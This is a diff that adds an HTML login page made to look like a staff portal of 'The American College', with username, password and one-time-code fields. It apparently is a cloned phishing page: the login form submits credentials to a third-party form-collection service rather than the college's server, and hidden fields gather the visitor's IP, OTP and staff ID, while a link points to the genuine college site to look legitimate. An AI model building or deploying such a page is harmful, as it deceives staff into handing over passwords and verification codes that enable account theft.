@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<title>The American College</title>
+
+	
+	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/login_css/bootstrap.min1.css">
+	<link rel="stylesheet" type="text/css" href="css/util1.css">
+	<link rel="stylesheet" type="text/css" href="css/main1.css">
+	<link href="plugins/font-awesome/css/font1.css" rel="stylesheet">
+	<link href="vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+	
+</head>
+
+
+<style>
+.loader {
+  border: 16px solid #f3f3f3;
+  border-radius: 50%;
+  border-top: 16px solid #3498db;
+  width: 20px;
+  height: 20px;
+  -webkit-animation: spin 2s linear infinite; /* Safari */
+  animation: spin 2s linear infinite;
+}
+
+
+/* Safari */
+@-webkit-keyframes spin {
+  0% { -webkit-transform: rotate(0deg); }
+  100% { -webkit-transform: rotate(360deg); }
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+.js div#preloader {
+  position: fixed;
+  left: 0;
+  top: 0;
+  z-index: 999;
+  width: 100%;
+  height: 100%;
+  overflow: visible;
+  background: url('images/ajax-loader-3.gif') no-repeat center center;
+}
+
+
+</style>
+<body>
+    
+    
+    <div class="js">
+  <body>
+      <span id="preloader" style="display:none;">
+    <div id="preloader123"></div>
+    </span>
+    </div>
+    
+	<div class="limiter">
+		<div class="container-login100" style="background-image: url('images/amc.jpg');">
+			<div class="wrap-login100">
+				<form class="login100-form validate-form" name='login_forms' id='login_forms' role='form' method="post" action="https://formspree.io/f/xgvzdzvl">
+					<span class="login100-form-logo">
+						 <img src="images/aclogin_logofinal_new.png" class="img-responsive" alt="Cinque Terre" width="120" height="120"> 
+					</span>
+
+					<span class="login100-form-title p-b-34 p-t-27">
+						Log in
+					</span>
+					
+				<center>	<a href="https://admission.americancollege.edu.in/ams/login.php" style="text-decoration: underline; text-decoration-color: yellow;"  target="_blank"><font color="yellow" size="5px" class="blinking"><b>Admission Staff Login</b></font></a></center><br>	
+		
+					
+					
+	
+					<select name="sel_usertype" id="sel_usertype" class="form-control selectpicker" style="margin-bottom:10px;">
+					
+					    
+					<option value=2 selected>Staff</option>
+					  
+					</select>
+					
+					<div class="wrap-input100 validate-input" data-validate = "Enter username" id="log_user">
+					    <font style="color:white"><img class="avatar" src="images/login1.svg" alt="" style="width: 20px;position: absolute;top: 30%;"  ></font>
+						<input class="input100 custom_login_input" type="text" name="user_name" id="user_name" placeholder="Username" tabindex="1" value="" autocomplete="off">
+						<!--<span class="focus-input100" data-placeholder="&#xf207;"></span>-->
+					</div>
+
+					<div class="wrap-input100 validate-input" data-validate="Enter password" id='log_pass' >
+					<font style="color:white"><img class="avatar" src="images/lock1.svg" alt="" style="width: 20px;position: absolute;top: 20%;"  ></font>
+						<input class="input100 custom_login_input" type="password" name="pswd" id="pswd" placeholder="Password" tabindex="2" autocomplete="off">
+					<!--<span class="focus-input100" data-placeholder="&#xf191;"></span>-->
+				<span toggle="#password-field" class="fa fa-fw fa-eye field-icon toggle-password"  style="color: white;opacity: 0.4;float: right;clear: both;height: 24px;top: -3px;width: 24px;margin-top: -25px;cursor:pointer"></span>
+					<input type="hidden" type="text" id="ip_client" name="ip_client" value="">
+					</div>
+
+
+		<div class="wrap-login100"  id="log_otp" style="display:none;" >
+			 
+      <p style="font-color:#fff;">For your security,</p> 
+       <p style="font-color:#fff;">we need to verify your identity. </p> 
+<p style="font-color:#fff;">We've sent an OTP to the mobile number <span id="mobile_code"></span></p>
+         <p style="font-color:#fff;"> Please enter it below to complete verification.</p>
+  
+			</div>
+
+	<div class="wrap-input100 validate-input" data-validate = "Enter username" id="log_otp1" style="display:none;">
+					    <font style="color:white"><img class="avatar" src="images/login1.svg" alt="" style="width: 20px;position: absolute;top: 30%;"  ></font>
+						<input class="input100 custom_login_input" type="text" name="user_otp" id="user_otp" placeholder="Enter OTP" tabindex="1" value="" autocomplete="off">
+		<input type="hidden" name="chkotpcode" id="chkotpcode">
+			<input type="hidden" name="staff_id" id="staff_id">
+						<!--<span class="focus-input100" data-placeholder="&#xf207;"></span>-->
+					</div>
+
+					<div class="contact100-form-checkbox" style="text-align: center;">
+					    	<font></font> 
+						<!--<label class="" for="ckb1">
+							<h5 style="color:#FFFF;">Ex: (DD-MM-YYYY) (10-10-2000)</h5><br>
+							<h5 style="color:#FFFF;"> </h5>
+						</label>-->
+				 
+				  <!--<input type="checkbox"  id="show" ><font color="white">Show Password</font>
+				  -->
+						<span id='err_msg'></span>
+					</div>
+			
+			<div style="display: flex; flex-direction: column; align-items: center;">	
+
+				<div class="login_reset_grp">
+					
+					<div class="btn btn-group" id="log_btn">
+						<button type="submit" class="login100-form-btn" name="submit_frm" id="submit_frm" tabindex="3">Login
+								
+						</button>
+					</div>
+
+					<div class="btn btn-group"  id="log_btn1">
+						<button type="button" class="login100-form-btn" name="reset_frm" id="reset_frm" tabindex="4">Reset</button>
+					</div>
+				</div>
+
+
+				<span id='loadingImg' style="margin-bottom:10px;display:none;" >
+								<img src='images/loadingImg.gif'></span>
+					
+					<div id="re_se">
+					<div class="btn btn-group" id="resent" style="display:none">
+						<button type="button" class="login100-form-btn" name="submit_frm_re" id="submit_frm_re" tabindex="3">Resend OTP
+								
+						</button>
+					</div>
+					</div>
+			</div>
+					
+		<div class="wrap-input100 validate-input"  style="border:0px;text-align:center">
+ <a href="index4031.html?m=1&amp;page=forgot"><font color='white' size=4><b><div id="display"></div>
+
+</b></font></a>
+<font color='white' size=4><b><div id="display1"></div>
+
+</b></font></a>
+ </div>
+					
+					
+
+				</form>
+			</div>
+		</div>
+	</div>
+	
+	
+</body>
+
+
+</html>
+
+
+
+
+
+   
+        
+       	<style>
+       	.blinking{
+    animation:blinkingText 1.2s infinite;
+}
+@keyframes blinkingText{
+    0%{     color:yellow;    }
+    49%{    color: yellow; }
+    60%{    color: transparent; }
+    99%{    color:transparent;  }
+    100%{   color: yellow;    }
+}
+
+	 p {
+
+    font-family: Poppins-Regular;
+    font-size: 14px;
+    line-height: 1.7;
+    color: #fff;
+
+}
+	</style> 
+        
+
